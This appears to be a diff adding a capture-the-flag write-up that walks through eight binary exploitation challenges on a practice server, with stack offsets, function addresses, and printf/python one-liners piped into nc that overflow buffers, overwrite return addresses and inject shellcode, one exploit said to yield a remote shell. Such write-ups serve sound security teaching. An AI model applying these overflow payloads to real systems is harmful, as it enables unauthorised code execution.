@@ -1,0 +1,112 @@
+1_aaaaah.txt
+
+It's very easy to overthink these early ones.  Fuzzing, looking for reliable segmentation faults..  Etc.  Don't do that.  On almost all of Goury's binaries he does this:
+
+ctf_readsn(fileno(stdin), (char *)&buf, 8)
+
+What this means, in practice, is the function that loads the buffers calls the address of the buffer by reference.  This means you can't overflow the call stack when the buffer is loaded.  You can only overflow something way down on the stack.  This is key to 8_gotime, but is a distraction here.
+
+On 1_aaaah we see:
+
+int key = 0xdeadbeef;
+int buf = 0x12345678;
+
+And then you need to get key=0x41414141 to call the success function.  Stacks are built from the bottom up, in order of declaration.  So 4 bytes are reserved for key, and set to 0xDEADBEEF.  Then 4 bytes are reserved adjacent and on top of key for buf.  Then he allows 8 bytes to be read into buf.  All you need to do is send 8 bytes, with the last 4 equal to 0x41414141 which is 'AAAA' in text.
+
+Using standard command line piping locally: 
+
+printf "whatAAAA" | ./1_aaaah
+
+And nc for the remote:
+
+printf "whatAAAA" | nc -v exploitables.dcdark.net 12345
+
+---------------------------------------------------
+2_pointme.txt
+
+This is much like 1_aaaah except we have to overflow key with the address of the success function.  Goury calls this address directly with:
+
+((void (*)())key)();
+
+key is declared as long long, so it's 64 bits.  Since all of his binaries are 64 bit, that works well.
+
+You have to get the address of callme.  I like to use r2 (radare2) for my debug work, but you can use gdb or even objdump in this case.
+
+>objdump -t 2_pointme | grep callme
+0000000000400f9d g     F .text	0000000000000018              callme
+
+The first number is the address you need.  But, you need to be sure to send it in 64-bit little endian.  pwntools has the p64 function which is awesome for this.
+
+>>> p64(0x0000000000400f9d)
+'\x9d\x0f@\x00\x00\x00\x00\x00'
+
+So, same as above, you need to overflow the 4 byte buff and then put the payload at the end.  Note that this call:
+
+ctf_readsn(fileno(stdin), (char *)&buf, 16)
+
+is reading 16 bytes.  So you need to cover the buffer, then the address, then an additional 4 bytes or a "\n" after the address to get this to work remote
+
+printf 'what\x9d\x0f@\x00\x00\x00\x00\x00what' | nc -v exploitables.dcdark.net 23456
+
+--------------------------------------------------------
+3_bigbuf
+
+Here you don't get the source.  But you can find a callme in here and then find the buffer length by any number of reverse engineering methods.  My normal method, using a cyclic string and then seeing where the exact offset causes a SIGFAULT, didn't seem to work very well in 64 bit land.  So I think I did detailed memory inspection and other stuff.  An easier way is to look at the top of the disassembled main function in r2 in visual mode.  You'll see:
+
+; var int local_110h @rbp-0x110
+; var int local_8h @ rbp-0x8
+
+0x110 - 0x8 = 264  That's the exact size of the buffer.  Handy.
+
+Address of callme is the same.
+
+echo $(python -c "print 'A'*264+'\x9d\x0f@\x00\x00\x00\x00\x00'") | ncat exploitables.dcdark.net  34567
+
+------------------------------------------------------
+4_retpointer
+
+This is close to a standard buffer overflow.  Because the buffer is declared in a called function, you can overwrite the ret value with your own value.  I don't remember how I determined the exact overflow offset, but normal reverse engineering and fuzzing can do it.  The address of callme can be determined the same way, but it hasn't changed.
+
+echo $(python -c "print 'A'*12+'\x9d\x0f@\x00\x00\x00\x00\x00'") | ncat exploitables.dcdark.net 45678
+
+-------------
+5_xorasm
+
+Okay, this is a test of assembly knowledge and logical operators.  You can't overflow the buffer.  But Goury executes your byte code directly.  He only lets you load 2 bytes and you have to zero out the ebx register.  The answer is implicit in the name of this challenge.  You just need to assemble the code you'll need.  I use the assembler in pwntools, but there are multiple ways.
+
+>>> asm("xor ebx,ebx") 
+'1\xdb'
+
+printf '1\xdb' | ncat exploitables.dcdark.net 56789
+
+------------------------
+6_babyrop
+
+See 6exploit_2.py
+
+I'm sorry to say that the exploit doesn't seem to work correctly against the service on dcdark.net  It works against the local binary and the local binary when served as a service with ncat, but something is off with the remote service.  It must have worked during the competition.  Something changed.  I'm not sure what.
+
+The python script is full of stuff I didn't use, left over from other exploits.  I'm sure you can figure it out.  Change the exploit destination in the setupPipe() function.
+
+-------------------------
+7_shelltime
+
+See 7exploit.py
+
+This is a straightforward overflow with a point back into the buffer you send.  The buffer address is given to you.  This exploit does still work against the dcdark.net service and delivers you into a straight remote shell.
+
+A lot of leftover stuff in there too.
+
+-------------------------
+8_gotime
+
+See 8exploit.py.  I commented the hell out of this one.
+
+Start in exploit(), then check the redo work from this week in getBuffAddress() for a full commentary.
+
+-------------------------
+That's as far as I've gotten so far!  Good luck!
+
+0tt3r
+
+
